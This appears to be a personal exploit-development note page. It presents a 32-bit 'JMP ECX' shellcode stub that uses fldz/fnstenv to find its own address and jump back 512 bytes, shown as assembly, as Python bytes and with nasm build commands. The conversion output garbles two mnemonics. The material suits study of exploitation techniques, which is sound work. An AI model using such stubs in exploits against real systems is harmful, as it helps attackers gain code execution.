<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>JMP ECX Method [FNSTENV]</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">JMP ECX Method [FNSTENV]</h1><br/><div class="codebox"><div class="codebox">[BITS&nbsp;<span style="color:#ff0044;font-weight:400">32</span>]<br />global&nbsp;_start<br /><br />_start:<br />;---&nbsp;Taken&nbsp;from&nbsp;Phrack&nbsp;#<span style="color:#ff0044;font-weight:400">62</span>&nbsp;Article&nbsp;<span style="color:#ff0044;font-weight:400">7</span>&nbsp;Originally&nbsp;written&nbsp;by&nbsp;Aaron&nbsp;Adams<br /><br />;---&nbsp;copy&nbsp;eip&nbsp;into&nbsp;ecx<br />fldz<br />fnstenv&nbsp;[esp-<span style="color:#ff0044;font-weight:400">12</span>]<br />pop&nbsp;ecx<br />add&nbsp;cl,&nbsp;<span style="color:#ff0044;font-weight:400">10</span><br />nop<br />;----------------------------------------------------------------------<br />dec&nbsp;ch<br />;&nbsp;ecx=-<span style="color:#ff0044;font-weight:400">256</span>;<br />dec&nbsp;ch<br />;&nbsp;ecx=-<span style="color:#ff0044;font-weight:400">256</span>;<br />jmp&nbsp;ecx<br />;&nbsp;lets&nbsp;jmp&nbsp;ecx&nbsp;(current&nbsp;location&nbsp;-&nbsp;<span style="color:#ff0044;font-weight:400">512</span>)<br /></div></div><br /><br /><div class="codebox"><div class="codebox">jmp_ecx&nbsp;=&nbsp;(<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xd9\xee"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;&nbsp;fldz</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xd9\x74\x24\xf4"</span>&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;&nbsp;fnstenv&nbsp;&nbsp;[esp-0xc]</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x59"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x80\xc1\x0a"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;cl,0xa</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x90"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;&nbsp;nop</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xfe\xcd"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;&nbsp;dec&nbsp;&nbsp;&nbsp;&nbsp;ch</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xfe\xcd"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;&nbsp;dec&nbsp;&nbsp;&nbsp;&nbsp;ch</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xff\xe1"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;&nbsp;jmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx</span><br />)</div></div><br /><br />$ nasm -f bin -o jmp_ecx.bin jmp_ecx.asm<br />$ bash ../../../shellcoding/generic/convert_bin_py-hex_asm.sh jmp_ecx.bin<br />"\xd9\xee"          #  fldz<br />"\xd9\x74\x24\xf4"  #  fnstenv  [esp-0xc]<br />"\x59"              #  pop      ecx<br />"\x80\xc1\x0a"      #  a\xdd    cl,0xa<br />"\x90"              #  nop<br />"\xfe\xcd"          #  d\xec    ch<br />"\xfe\xcd"          #  d\xec    ch<br />"\xff\xe1"          #  jmp      ecx<br /><br /></div></body></html>